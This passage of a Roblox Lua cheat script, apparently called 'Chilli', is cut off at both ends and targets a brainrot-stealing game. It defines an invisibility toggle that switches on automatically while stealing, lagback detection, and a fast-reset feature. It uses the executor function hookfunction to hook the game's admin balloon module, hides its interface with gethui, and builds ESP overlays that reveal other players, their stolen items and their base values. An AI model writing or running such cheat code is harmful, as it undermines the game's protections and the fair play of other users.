					if not flag or n62 ~= n6 or not flag3 or arg ~= localPlayer.Character then
						return
					end
					local humanoid = arg and arg:FindFirstChildOfClass("Humanoid")
					local humanoidRootPart = arg and arg:FindFirstChild("HumanoidRootPart")
					if humanoid and fn14(humanoid) and humanoidRootPart and humanoidRootPart.Parent == arg and fn20() then
						return
					end
					task.wait(0.1)
				end
			end)
		end

		local invisibleToggle = invisibilitySection:CreateToggle({
			Name = "Invisible",
			Default = false,
			Keybind = Enum.KeyCode.U,
			Callback = function(arg)
				flag3 = arg == true

				if flag3 then
					fn21(localPlayer.Character, 0.15)
				else
					fn19()
				end
			end,
		})

		local function fn22()
			if not (not flag5 or not invisibleToggle) then
				local flag10 = localPlayer:GetAttribute("Stealing") == true
				if invisibleToggle:Get() ~= flag10 then
					invisibleToggle:Set(flag10, true)
					return
				end

				if flag10 then
					flag3 = true
				else
					flag3 = false
					fn19()
				end
			end
		end

		invisibilitySection:CreateToggle({
			Name = "Auto Invisible On Steal",
			Default = false,
			Callback = function(arg)
				flag5 = arg == true

				if flag5 then
					fn22()
				end
			end,
		})

		invisibilitySection:CreateToggle({
			Name = "Auto Rotation",
			Default = true,
			Callback = function(arg)
				flag8 = arg == true
				n8 = 0
				fn17()
			end,
		})

		invisibilitySection:CreateSlider({
			Name = "Rotation",
			Min = 180,
			Max = 300,
			Default = 279,
			AllowDecimals = false,
			Increment = 1,
			Callback = function(arg)
				local clamp = math.clamp
				local floor = math.floor
				n3 = clamp(floor((tonumber(arg) or 225) + 0.5), 180, 300)
			end,
		})

		invisibilitySection:CreateSlider({
			Name = "Depth",
			Min = 0,
			Max = 0.7,
			Default = 0.12,
			AllowDecimals = true,
			DecimalPlaces = 2,
			Increment = 0.01,
			Callback = function(arg)
				n2 = math.clamp(tonumber(arg) or 0.09, 0, 0.7)
			end,
		})

		invisibilitySection:CreateToggle({
			Name = "Lagback Detect",
			Default = true,
			Callback = function(arg)
				flag6 = arg == true
			end,
		})

		invisibilitySection:CreateToggle({
			Name = "Auto Fix Lagback",
			Default = false,
			Callback = function(arg)
				flag7 = arg == true

				if not flag7 then
					n4 += 1
					flag9 = false
				end
			end,
		})

		tbl.IsActive = function()
			return flag4 == true
		end

		tbl.GetDrop = function()
			local v52 = v5 or localPlayer.Character
			local humanoid = v52 and v52:FindFirstChildOfClass("Humanoid")

			if v52 then
				v52 = v52.PrimaryPart or v52:FindFirstChild("HumanoidRootPart")
			end

			return (humanoid and humanoid.HipHeight and humanoid.HipHeight > 0 and humanoid.HipHeight or 2) + (v52 and v52.Size and v52.Size.Y or 2) * 0.5 - 1 + n2
		end

		tbl.SuspendForReset = function(arg)
			local v52 = v5
			local v522

			if v5 then
				v522 = arg
			else
				v522 = v52
			end

			if v522 and arg ~= v5 then
				return false
			end
			local flag42 = flag4
			fn19()
			return flag42
		end

		tbl.ResumeIfRequested = function(arg)
			if arg == localPlayer.Character then
				fn21(arg, 0.05)
			end
		end

		local connection = localPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
			fn22()
			fn17()
		end)

		local connection2 = localPlayer.CharacterRemoving:Connect(function(character_)
			if character_ == localPlayer.Character or character_ == v5 then
				fn19()
			end
		end)

		local connection3 = localPlayer.CharacterAdded:Connect(function(character_)
			if v5 and v5 ~= character_ then
				fn19()
			end

			fn21(character_, 0.35)
		end)

		fn(function()
			flag3 = false
			flag5 = false
			flag9 = false
			fn19()
			fn12(connection)
			fn12(connection2)
			fn12(connection3)
			tbl.SuspendForReset = nil
			tbl.ResumeIfRequested = nil
			tbl.IsActive = nil
			tbl.GetDrop = nil
		end)
	end

	do
		local flag9 = true
		local flag10 = false
		local flag11 = true
		local flag12 = false
		local flag13 = false
		local v6 = nil
		local result3 = nil
		local flag14 = false
		local connections2 = {}
		local connection = nil
		local chilliFastResetRuntime = CoreGui:FindFirstChild("__ChilliFastResetRuntime")

		if chilliFastResetRuntime then
			local cleanup = chilliFastResetRuntime:FindFirstChild("Cleanup")

			if cleanup and cleanup:IsA("BindableEvent") then
				pcall(function()
					cleanup:Fire()
				end)
			end

			pcall(function()
				chilliFastResetRuntime:Destroy()
			end)
		end

		local chilliFastResetRuntime2 = Instance.new("Folder")
		chilliFastResetRuntime2.Name = "__ChilliFastResetRuntime"
		chilliFastResetRuntime2.Archivable = false
		chilliFastResetRuntime2.Parent = CoreGui
		local cleanup = Instance.new("BindableEvent")
		cleanup.Name = "Cleanup"
		cleanup.Parent = chilliFastResetRuntime2

		local function disconnectAll2()
			for _, v7 in ipairs(connections2) do
				if v7.Connected then
					v7:Disconnect()
				end
			end

			table.clear(connections2)
		end

		local function fn13()
			return false
		end

		local function fn14()
			return fn13(localPlayer.Character, false)
		end

		local function fn15()
			local flag15 = not flag12
			if flag15 or flag13 then
				return
			end
			flag13 = true

			task.spawn(function()
				if flag12 then
				end

				flag13 = false
			end)
		end

		local function fn16()
			if flag14 and v6 and result3 and type(hookfunction) == "function" then
				pcall(function()
					hookfunction(v6, result3)
				end)
			end

			flag14 = false
			v6 = nil
			result3 = nil
		end

		local function fn17()
			if flag14 then
				return true
			end

			if type(hookfunction) == "function" then
				local ok, result = pcall(function()
					return require(ReplicatedStorage.Datas.AdminCommands.balloon).effects.Victim
				end)

				if not (not ok or type(result) ~= "function") then
					v6 = result
					local result4 = nil

					local ok2, result2 = pcall(function()
						return hookfunction(result, function(...)
							local v7 = table.pack(result4(...))

							if flag12 then
								task.defer(fn15)
							end

							return table.unpack(v7, 1, v7.n)
						end)
					end)

					if not ok2 or type(result2) ~= "function" then
						v6 = nil
						return false
					end
					result4 = result2
					result3 = result2
					flag14 = true
					return true
				end
			end

			return false
		end

		local function fn18(arg)
			flag12 = arg == true
			flag13 = false

			if flag12 then
				if not fn17() then
					flag12 = false
				end
			else
				fn16()
			end
		end

		local function fn19(arg)
			disconnectAll2()
			if not flag11 or not arg then
				return
			end

			task.spawn(function()
				local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
				if not flag11 or not humanoid or arg ~= localPlayer.Character then
					return
				end
				local v7, v8

				local function fn20()
				end

				connections2[#connections2 + 1] = humanoid.HealthChanged:Connect(function(health)
					if health <= 0 then
						fn20()
					end
				end)

				connections2[#connections2 + 1] = humanoid.Died:Connect(fn20)
			end)
		end

		local function fn20(arg)
			flag11 = arg == true

			if flag11 then
				fn19(localPlayer.Character)
			else
				disconnectAll2()
			end
		end

		local function fn21()
			flag9 = false
			flag10 = false
			flag11 = false
			flag12 = false
			flag13 = false
			disconnectAll2()
			fn16()
			connection:Disconnect()
			connection = nil
		end

		connection = localPlayer.CharacterAdded:Connect(function(character_)
			flag10 = false

			if flag11 then
				fn19(character_)
			end
		end)

		cleanup.Event:Connect(fn21)
		chilliFastResetRuntime2.Destroying:Connect(fn21)
		respawnSection:CreateButton({ Name = "Fast Reset", ButtonText = "Reset", Callback = fn14 })
		respawnSection:CreateToggle({ Name = "Auto Fast Reset", Default = true, Callback = fn20 })
		respawnSection:CreateToggle({ Name = "Auto Reset Balloon", Default = false, Callback = fn18 })
		fn19(localPlayer.Character)
	end

	local playerEspSection
	playerEspSection = espTab:CreateSection({ Name = "Player ESP", Expanded = false })
	brainrotEspSection = espTab:CreateSection({ Name = "Brainrot ESP", Expanded = false })
	brainrotNotificationsSection = espTab:CreateSection({ Name = "Brainrot Notifications", Expanded = false })
	baseEspSection = espTab:CreateSection({ Name = "Base ESP", Expanded = false })

	fn2 = function()
		if type(gethui) == "function" then
			local ok, result = pcall(gethui)
			if ok and typeof(result) == "Instance" then
				return result
			end
		end

		return CoreGui
	end

	fn3 = function(name)
		local v6 = fn2()
		local tbl4 = {}

		for _, v7 in ipairs({ v6, CoreGui }) do
			if v7 and not tbl4[v7] then
				tbl4[v7] = true
				local v8 = v7:FindFirstChild(name)

				if v8 then
					local cleanup = v8:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end

					pcall(function()
						v8:Destroy()
					end)
				end
			end
		end

		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = name
		screenGui.Archivable = false
		screenGui.ResetOnSpawn = false
		screenGui.IgnoreGuiInset = true
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.DisplayOrder = 48
		screenGui.Parent = v6
		local cleanup = Instance.new("BindableEvent")
		cleanup.Name = "Cleanup"
		cleanup.Parent = screenGui
		return screenGui, cleanup
	end

	disconnectAll = function(arg)
		for _, v6 in ipairs(arg) do
			if typeof(v6) == "RBXScriptConnection" then
				v6:Disconnect()
			end
		end

		table.clear(arg)
	end

	fn4 = function()
		local v6 = Workspace:FindFirstChild(localPlayer.Name)

		if not (not v6 or not v6:IsA("Model")) then
			local humanoidRootPart = v6:FindFirstChild("HumanoidRootPart")
			if humanoidRootPart and humanoidRootPart:IsA("BasePart") and humanoidRootPart.Parent == v6 then
				return humanoidRootPart
			end
			local hitbox = v6:FindFirstChild("__HITBOX") or v6:FindFirstChild("__hitbox") or v6:FindFirstChild("Hitbox") or v6:FindFirstChild("HitBox")
			if hitbox and hitbox:IsA("BasePart") then
				return hitbox
			end
		end

		return nil
	end

	fn5 = function(arg)
		arg = arg and arg:FindFirstChild("PlotSign")
		if not arg then
			return nil
		end

		for _, descendant in ipairs(arg:GetDescendants()) do
			if descendant:IsA("TextLabel") then
				local str = tostring(descendant.Text or "")
				if str ~= "" and string.lower(str) ~= "your base" and string.find(string.lower(str), "base", 1, true) then
					return descendant
				end
			end
		end

		return nil
	end

	local fn13

	fn13 = function(arg)
		local str = fn5(arg)

		if str then
			str = tostring(str.Text or "")
		end

		str = str or ""
		return str ~= "" and str or "Base"
	end

	local fn14
	local n5 = 12

	fn14 = function(arg)
		if not arg then
			return nil
		end
		local animalPodiums = arg:FindFirstChild("AnimalPodiums")
		local huge = math.huge
		local n6 = -math.huge
		local n7 = -math.huge
		local huge2 = math.huge
		local huge3 = math.huge

		if animalPodiums then
			for _, child in ipairs(animalPodiums:GetChildren()) do
				local base = child:FindFirstChild("Base")
				base = base and base:FindFirstChild("Spawn")

				if base and base:IsA("BasePart") then
					local position = base.Position
					huge3 = math.min(huge3, position.X)
					n7 = math.max(n7, position.X)
					huge = math.min(huge, position.Z)
					n6 = math.max(n6, position.Z)
					huge2 = math.min(huge2, position.Y)
				end
			end
		end

		local stealHitbox = arg:FindFirstChild("StealHitbox")
		local x, z

		if stealHitbox and stealHitbox:IsA("BasePart") then
			x = stealHitbox.Position.X
			z = stealHitbox.Position.Z

			if huge2 == math.huge then
				huge2 = stealHitbox.Position.Y - stealHitbox.Size.Y * 0.5
			end
		elseif huge3 ~= math.huge then
			x = (huge3 + n7) * 0.5
			z = (huge + n6) * 0.5
		else
			local mainRoot = arg:FindFirstChild("MainRoot")
			local isBasePart2 = mainRoot and mainRoot:IsA("BasePart")
			z = nil
			x = nil

			if isBasePart2 then
				x = mainRoot.Position.X
				z = mainRoot.Position.Z
				huge2 = mainRoot.Position.Y
			end
		end

		if not x or huge2 == math.huge then
			return nil
		end
		return Vector3.new(x, huge2 + n5, z)
	end

	isBasePart = function(arg)
		return arg and arg:IsA("BasePart") and (arg.Name == "PlotSign" or arg.Name == "MainRoot" or arg.Name == "Spawn")
	end

	tbl3 = { YourBaseClear = false, ClearBaseTransparency = 0.8 }
	local list = {}

	fn6 = function(arg)
		list[#list + 1] = arg
	end

	fn7 = function(arg, arg2)
		if tbl3[arg] ~= arg2 then
			tbl3[arg] = arg2

			for _, v6 in ipairs(list) do
				pcall(v6, arg, arg2)
			end
		end
	end

	do
		local v6 = nil

		local ok, result = pcall(function()
			return require(ReplicatedStorage.Datas.Index)
		end)

		if ok and type(result) == "table" then
			v6 = result
		end

		fn8 = function(arg)
			local baseColors = {}
			local v62 = v6 and v6[arg]

			if v62 then
				if type(v62.BaseColors) == "table" then
					for _, baseColor in pairs(v62.BaseColors) do
						if typeof(baseColor) == "Color3" then
							baseColors[#baseColors + 1] = baseColor
						end
					end
				end

				if #baseColors == 0 and typeof(v62.MainColor) == "Color3" then
					baseColors[#baseColors + 1] = v62.MainColor
				end
			end

			return baseColors
		end
	end

	local n6
	n6 = 5
	local n7
	n7 = 12
	local n8
	n8 = 4.5
	local torsoList
	torsoList = { "HumanoidRootPart", "LowerTorso", "UpperTorso", "Torso", "Head" }
	local font
	font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Italic)
	local n9
	n9 = 0.25
	local transparency
	transparency = 0
	local enabledFlags

	enabledFlags = {
		Head = true,
		Torso = true,
		UpperTorso = true,
		LowerTorso = true,
		["Left Arm"] = true,
		["Right Arm"] = true,
		["Left Leg"] = true,
		["Right Leg"] = true,
		LeftUpperArm = true,
		LeftLowerArm = true,
		LeftHand = true,
		RightUpperArm = true,
		RightLowerArm = true,
		RightHand = true,
		LeftUpperLeg = true,
		LeftLowerLeg = true,
		LeftFoot = true,
		RightUpperLeg = true,
		RightLowerLeg = true,
		RightFoot = true,
	}

	local font2
	font2 = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
	local v6

	do
		local colorSequenceNew = ColorSequence.new
		local tbl4 = {}
		local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 255, 205))
		local colorKeypoint2 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(125, 225, 255))
		local colorSequenceKeypointNew = ColorSequenceKeypoint.new
		local color3FromRGB = Color3.fromRGB
		tbl4[1] = colorKeypoint
		tbl4[2] = colorKeypoint2

		do
			local values = table.pack(colorSequenceKeypointNew(1, color3FromRGB(210, 135, 255)))
			table.move(values, 1, values.n, 3, tbl4)
		end

		v6 = colorSequenceNew(tbl4)
	end

	local colorSequence

	do
		local colorSequenceKeypointNew = ColorSequenceKeypoint.new
		local color3FromRGB = Color3.fromRGB
		colorSequence = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(7, 73, 66)), colorSequenceKeypointNew(1, color3FromRGB(35, 17, 79)) })
	end

	local v7

	do
		local colorSequenceNew = ColorSequence.new
		local tbl4 = {}
		local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 105))
		local colorKeypoint2 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 28, 40))
		local colorSequenceKeypointNew = ColorSequenceKeypoint.new
		local color3FromRGB = Color3.fromRGB
		tbl4[1] = colorKeypoint
		tbl4[2] = colorKeypoint2

		do
			local values = table.pack(colorSequenceKeypointNew(1, color3FromRGB(184, 0, 18)))
			table.move(values, 1, values.n, 3, tbl4)
		end

		v7 = colorSequenceNew(tbl4)
	end

	local v8

	do
		local colorSequenceNew = ColorSequence.new
		local tbl4 = {}
		local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(124, 0, 15))
		local colorKeypoint2 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(61, 0, 9))
		local colorSequenceKeypointNew = ColorSequenceKeypoint.new
		local color3FromRGB = Color3.fromRGB
		tbl4[1] = colorKeypoint
		tbl4[2] = colorKeypoint2

		do
			local values = table.pack(colorSequenceKeypointNew(1, color3FromRGB(18, 0, 3)))
			table.move(values, 1, values.n, 3, tbl4)
		end

		v8 = colorSequenceNew(tbl4)
	end

	local valueMap

	valueMap = {
		[""] = 1,
		K = 1000,
		M = 1000000,
		B = 1e9,
		T = 1e12,
		Qa = 1e15,
		Qi = 1e18,
		Sx = 1e21,
		Sp = 1e24,
		Oc = 1e27,
		No = 1e30,
		Dc = 1e33,
	}

	local tbl4
	tbl4 = {}
	local tbl5

	tbl5 = {
		Limit = 1000000,
		Fill = Color3.fromRGB(255, 196, 66),
		Outline = Color3.fromRGB(255, 232, 152),
	}

	do
		local colorSequenceNew = ColorSequence.new
		local tbl6 = {}
		local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 231, 158))
		local colorKeypoint2 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 196, 66))
		local colorSequenceKeypointNew = ColorSequenceKeypoint.new
		local color3FromRGB = Color3.fromRGB
		tbl6[1] = colorKeypoint
		tbl6[2] = colorKeypoint2

		do
			local values = table.pack(colorSequenceKeypointNew(1, color3FromRGB(214, 142, 12)))
			table.move(values, 1, values.n, 3, tbl6)
		end

		tbl5.Text = colorSequenceNew(tbl6)
	end

	do
		local colorSequenceNew = ColorSequence.new
		local tbl6 = {}
		local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(122, 76, 0))
		local colorKeypoint2 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(62, 38, 0))
		local colorSequenceKeypointNew = ColorSequenceKeypoint.new
		local color3FromRGB = Color3.fromRGB
		tbl6[1] = colorKeypoint
		tbl6[2] = colorKeypoint2

		do
			local values = table.pack(colorSequenceKeypointNew(1, color3FromRGB(20, 12, 0)))
			table.move(values, 1, values.n, 3, tbl6)
		end

		tbl5.Stroke = colorSequenceNew(tbl6)
	end

	do
		local tbl6 = {
			Limit = 10000000,
			Fill = Color3.fromRGB(255, 146, 40),
			Outline = Color3.fromRGB(255, 194, 112),
		}

		local colorSequenceNew = ColorSequence.new
		local tbl7 = {}
		local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 198, 132))
		local colorKeypoint2 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 146, 40))
		local colorSequenceKeypointNew = ColorSequenceKeypoint.new
		local color3FromRGB = Color3.fromRGB
		tbl7[1] = colorKeypoint
		tbl7[2] = colorKeypoint2

		do
			local values = table.pack(colorSequenceKeypointNew(1, color3FromRGB(206, 92, 0)))
			table.move(values, 1, values.n, 3, tbl7)
		end

		tbl6.Text = colorSequenceNew(tbl7)
		local colorSequenceNew2 = ColorSequence.new
		local tbl8 = {}
		local colorKeypoint3 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 50, 0))
		local colorKeypoint4 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 25, 0))
		local colorSequenceKeypointNew2 = ColorSequenceKeypoint.new
		local color3FromRGB2 = Color3.fromRGB
		tbl8[1] = colorKeypoint3
		tbl8[2] = colorKeypoint4

		do
			local values = table.pack(colorSequenceKeypointNew2(1, color3FromRGB2(18, 8, 0)))
			table.move(values, 1, values.n, 3, tbl8)
		end

		tbl6.Stroke = colorSequenceNew2(tbl8)

		local tbl9 = {
			Limit = 100000000,
			Fill = Color3.fromRGB(255, 82, 38),
			Outline = Color3.fromRGB(255, 140, 96),
		}

		local colorSequenceNew3 = ColorSequence.new
		local tbl10 = {}
		local colorKeypoint5 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 158, 116))
		local colorKeypoint6 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 82, 38))
		local colorSequenceKeypointNew3 = ColorSequenceKeypoint.new
		local color3FromRGB3 = Color3.fromRGB
		tbl10[1] = colorKeypoint5
		tbl10[2] = colorKeypoint6

		do
			local values = table.pack(colorSequenceKeypointNew3(1, color3FromRGB3(196, 40, 0)))
			table.move(values, 1, values.n, 3, tbl10)
		end

		tbl9.Text = colorSequenceNew3(tbl10)
		local colorSequenceNew4 = ColorSequence.new
		local tbl11 = {}
		local colorKeypoint7 = ColorSequenceKeypoint.new(0, Color3.fromRGB(108, 24, 0))
		local colorKeypoint8 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(54, 12, 0))
		local colorSequenceKeypointNew4 = ColorSequenceKeypoint.new
		local color3FromRGB4 = Color3.fromRGB
		tbl11[1] = colorKeypoint7
		tbl11[2] = colorKeypoint8

		do
			local values = table.pack(colorSequenceKeypointNew4(1, color3FromRGB4(18, 4, 0)))
			table.move(values, 1, values.n, 3, tbl11)
		end

		tbl9.Stroke = colorSequenceNew4(tbl11)

		local tbl12 = {
			Limit = math.huge,
			Fill = Color3.fromRGB(220, 12, 28),
			Outline = Color3.fromRGB(255, 55, 65),
			Text = v7,
			Stroke = v8,
		}

		tbl4[1] = tbl5
		tbl4[2] = tbl6
		tbl4[3] = tbl9
		tbl4[4] = tbl12
	end

	local fn15

	local function fn16(arg)
		if type(arg) ~= "string" then
			return nil
		end
		local match, match2 = arg:match("%$%s*([%d%.]+)%s*(%a*)")
		local num = tonumber(match)
		if not num then
			return nil
		end

		if match2 ~= "" then
			match2 = match2:sub(1, 1):upper() .. match2:sub(2):lower()
		end

		return num * (valueMap[match2] or 1)
	end

	fn15 = function(arg)
		local v9 = fn16(arg)

		if v9 then
			for _, v10 in ipairs(tbl4) do
				if v9 < v10.Limit then
					return v10
				end
			end
		end

		return tbl4[#tbl4]
	end

	local chilliPlayerESPRuntime

	do
		local function fn17()
			if type(gethui) == "function" then
				local ok, result = pcall(gethui)
				if ok and typeof(result) == "Instance" then
					return result
				end
			end

			return CoreGui
		end

		local v9 = fn17()
		local tbl6 = {}

		for _, v10 in ipairs({ v9, CoreGui }) do
			if v10 and not tbl6[v10] then
				tbl6[v10] = true
				local chilliPlayerESPRuntime2 = v10:FindFirstChild("__ChilliPlayerESPRuntime")

				if chilliPlayerESPRuntime2 then
					local cleanup = chilliPlayerESPRuntime2:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end

					pcall(function()
						chilliPlayerESPRuntime2:Destroy()
					end)
				end
			end
		end

		chilliPlayerESPRuntime = Instance.new("ScreenGui")
		chilliPlayerESPRuntime.Name = "__ChilliPlayerESPRuntime"
		chilliPlayerESPRuntime.Archivable = false
		chilliPlayerESPRuntime.ResetOnSpawn = false
		chilliPlayerESPRuntime.IgnoreGuiInset = true
		chilliPlayerESPRuntime.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		chilliPlayerESPRuntime.DisplayOrder = 50
		chilliPlayerESPRuntime.Parent = v9
	end

	local cleanup
	cleanup = Instance.new("BindableEvent")
	cleanup.Name = "Cleanup"
	cleanup.Parent = chilliPlayerESPRuntime
	local screenGui
	screenGui = chilliPlayerESPRuntime
	local flag9
	flag9 = false
	local enabledFlags2

	enabledFlags2 = {
		Name = true,
		Username = false,
		Avatar = true,
		Tool = true,
		Brainrot = true,
		["Admin Panel"] = true,
	}

	local n10
	n10 = 1
	local playerMap
	playerMap = {}
	local connections2
	connections2 = {}
	local userIdMap
	userIdMap = {}
	local n11
	n11 = 0
	local disconnectAll2

	disconnectAll2 = function(arg)
		for _, v9 in ipairs(arg) do
			if v9.Connected then
				v9:Disconnect()
			end
		end

		table.clear(arg)
	end

	local fn17

	fn17 = function(arg)
		local nameDisplayHumanoid = arg.NameDisplayHumanoid
		local nameDisplayDistance = arg.NameDisplayDistance

		if nameDisplayHumanoid and nameDisplayHumanoid.Parent and nameDisplayDistance ~= nil then
			pcall(function()
				nameDisplayHumanoid.NameDisplayDistance = nameDisplayDistance
			end)
		end

		arg.NameDisplayHumanoid = nil
		arg.NameDisplayDistance = nil
	end

	local fn18

	fn18 = function(arg, nameDisplayHumanoid)
		nameDisplayHumanoid = nameDisplayHumanoid and nameDisplayHumanoid:FindFirstChildOfClass("Humanoid")
		if not nameDisplayHumanoid then
			return
		end

		if arg.NameDisplayHumanoid ~= nameDisplayHumanoid then
			fn17(arg)
			arg.NameDisplayHumanoid = nameDisplayHumanoid
			arg.NameDisplayDistance = nameDisplayHumanoid.NameDisplayDistance
		end

		nameDisplayHumanoid.NameDisplayDistance = 0
	end

	local fn19, fn20

	do
		local function fn21(arg)
			local str = tostring(arg or "")
			if str == "" then
				return ""
			end

			if str:match("^%d+$") then
				return "rbxassetid://" .. str
			end
			return str
		end

		local function fn22(arg)
			if not (not arg or not arg:IsA("Tool")) then
				local v9 = fn21(arg.TextureId)

				if v9 == "" then
					for _, v10 in ipairs({ "Icon", "Image", "Thumbnail", "TextureId" }) do
						local attribute = arg:GetAttribute(v10)
						if type(attribute) ~= "string" then
							continue
						end
						v9 = fn21(attribute)
						if v9 ~= "" then
							return v9
						end
					end

					for _, descendant in ipairs(arg:GetDescendants()) do
						if descendant:IsA("Decal") or descendant:IsA("Texture") then
							v9 = fn21(descendant.Texture)
						elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
							v9 = fn21(descendant.Image)
						end

						if v9 ~= "" then
							return v9
						end
					end

					return ""
				end

				return v9
			end

			return ""
		end

		local function getTool(arg)
			return arg and arg:FindFirstChildOfClass("Tool") or nil
		end

		fn19 = function(arg, arg2)
			for _, v9 in ipairs(torsoList) do
				local v10 = arg:FindFirstChild(v9)
				if v10 and v10:IsA("BasePart") then
					return v10
				end
			end

			return arg2
		end

		local function parseVector3(arg, arg2)
			if arg2 == arg then
				return Vector3.new(0, 3.1, 0)
			end
			local n12 = arg.Position.Y - arg2.Position.Y
			if math.abs(n12) <= n8 then
				return Vector3.new(0, math.clamp(n12 + 3.1, 3.8, 6), 0)
			end
			return Vector3.new(0, 4.8, 0)
		end

		local function fn23(arg, arg2)
			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("Weld") or descendant:IsA("WeldConstraint") then
					local part0 = descendant.Part0
					local part1 = descendant.Part1
					local part

					if part0 and not part0:IsDescendantOf(arg) then
						part = part0
					else
						local part2 = part1 and not part1:IsDescendantOf(arg)
						local v9 = nil
						local v10 = nil

						if part2 then
							part = part1
							part1 = part0
						else
							part = v9
							part1 = v10
						end
					end

					if part and part:IsA("BasePart") and part.Parent == Workspace and part1 and part1:IsA("BasePart") and part1:IsDescendantOf(arg) and (part.Position - arg2.Position).Magnitude <= n6 then
						return part, part1
					end
				end
			end

			return nil
		end

		local function fn24(arg)
			if type(arg) ~= "string" or not arg:find("/s", 1, true) then
				return false
			end
			local match = arg:match("%$([%d%.]+)")
			local flag10 = match ~= nil

			if flag10 then
				flag10 = (tonumber(match) or 0) > 0
			end

			return flag10
		end

		local function fn25(arg, arg2)
			for k, attribute in pairs(arg:GetAttributes()) do
				if k ~= "__AssetDescendantCount" and arg2:GetAttribute(k) ~= attribute then
					return false
				end
			end

			return true
		end

		local function fn26(arg)
			local generation = arg:FindFirstChild("Generation", true)
			if generation and generation:IsA("TextLabel") and fn24(generation.Text) then
				return generation
			end
			local plots = Workspace:FindFirstChild("Plots")
			local debris = Workspace:FindFirstChild("Debris")

			if not (not plots or not debris) then
				local positions = {}
				local positions2 = {}

				for _, child in ipairs(plots:GetChildren()) do
					for _, child2 in ipairs(child:GetChildren()) do
						if child2:IsA("Model") and child2.Name == arg.Name then
							local position = child2:GetPivot().Position
							positions2[#positions2 + 1] = position

							if fn25(arg, child2) then
								positions[#positions + 1] = position
							end
						end
					end
				end

				positions = #positions > 0 and positions or positions2

				if #positions ~= 0 then
					local mutation = arg:FindFirstChild("Mutation", true)
					local text = mutation and mutation:IsA("TextLabel") and mutation.Text or nil
					local huge = math.huge
					local generation2 = nil

					for _, child in ipairs(debris:GetChildren()) do
						if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
							local animalOverhead = child:FindFirstChild("AnimalOverhead")
							local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")
							local generation3 = animalOverhead and animalOverhead:FindFirstChild("Generation")
							animalOverhead = animalOverhead and animalOverhead:FindFirstChild("Mutation")

							if displayName and displayName:IsA("TextLabel") and displayName.Text == arg.Name and generation3 and generation3:IsA("TextLabel") and fn24(generation3.Text) then
								local huge2 = math.huge

								for _, position in ipairs(positions) do
									huge2 = math.min(huge2, (child.Position - position).Magnitude)
								end

								local isTextLabel = text and animalOverhead and animalOverhead:IsA("TextLabel") and animalOverhead.Text ~= text
								local n12 = 0

								if isTextLabel then
									n12 = 1000
								end

								local n13 = huge2 + n12

								if n13 < huge then
									huge = n13
									generation2 = generation3
								end
							end
						end
					end

					return generation2
				end
			end

			return nil
		end

		local function fn27(arg)
			if not arg then
				return nil
			end
			local mutation = arg:FindFirstChild("Mutation", true)
			if mutation and mutation:IsA("TextLabel") then
				return mutation
			end
			return nil
		end

		local function fn28(arg)
			if not (arg and arg.Parent and arg.Visible) then
				return nil
			end
			local str = tostring(arg.Text or "")
			if str == "" then
				return nil
			end

			local tbl6 = {
				Text = str,
				RichText = arg.RichText == true,
				Color = arg.TextColor3,
				Font = arg.FontFace,
				Gradient = nil,
				StrokeColor = nil,
			}

			local uiStroke = arg:FindFirstChildOfClass("UIStroke")

			if uiStroke then
				tbl6.StrokeColor = uiStroke.Color
			end

			local uiGradient = arg:FindFirstChildOfClass("UIGradient")

			if uiGradient then
				tbl6.Gradient = { Color = uiGradient.Color, Rotation = uiGradient.Rotation }
			end

			return tbl6
		end

		local function fn29(arg)
			if arg:GetAttribute("Stealing") == true then
				local character_ = arg.Character
				local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return nil
				end
				local huge = math.huge
				local child = nil

				for _, child2 in ipairs(Workspace:GetChildren()) do
					if child2:IsA("Model") and child2 ~= character_ and not Players:GetPlayerFromCharacter(child2) and child2.Name:sub(-6) ~= "_Clone" then
						local rootPart = child2:FindFirstChild("RootPart") or child2.PrimaryPart or child2:FindFirstChildWhichIsA("BasePart")

						if rootPart and rootPart:IsA("BasePart") then
							local v9, v10 = fn23(child2, humanoidRootPart)

							if v9 and v10 then
								local vector = humanoidRootPart.CFrame:PointToObjectSpace(v9.Position)
								local magnitude = (v10.Position - humanoidRootPart.Position).Magnitude

								if math.abs(vector.X) <= 4 and vector.Y >= -2 and vector.Y <= 6 and vector.Z >= -6 and vector.Z <= 3 and magnitude <= n7 then
									local n12 = (v9.Position - humanoidRootPart.Position).Magnitude + magnitude * 0.05

									if n12 < huge then
										huge = n12
										child = child2
									end
								end
							end
						end
					end
				end

				if child then
					local v9 = fn26(child)
